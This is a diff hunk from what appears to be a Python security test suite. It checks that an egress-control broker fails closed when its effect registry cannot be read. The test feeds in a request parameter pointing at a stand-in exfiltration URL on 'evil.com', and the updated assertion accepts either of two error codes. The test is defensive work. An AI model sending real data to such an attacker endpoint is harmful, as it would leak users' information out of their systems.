@@ -242,8 +242,11 @@ class _BadReg:
 bR._effect_registry = _BadReg(); bR._effect_gate = None
 pr = {"url": "https://evil.com/exfil"}
 r = bR._handle(_rq("h4", "post", pr, _g(v2, "h4", "post", pr, "p4", ("n:o",))))
-ok(r.get("error_code") == "EGRESS_ERROR" and not hitr,
-   "E3: a registry read failure FAILS CLOSED — an error handler is not a bypass")
+ok(r.get("error_code") in ("EGRESS_ERROR", "REGISTRY_ERROR") and not hitr,
+   "E3: a registry read failure FAILS CLOSED — an error handler is not a bypass. "
+   "(The refusal MOVED EARLIER: it is now REGISTRY_ERROR raised at the read itself, "
+   "unconditionally, rather than EGRESS_ERROR raised further down only when the params "
+   "also contained a destination. Same intent, strictly stronger.)")
 
 # E5: an unenforced broker with an undeclared actuator is covered by the mismatch rule
 bU, hitu = _mk(enf=False), []
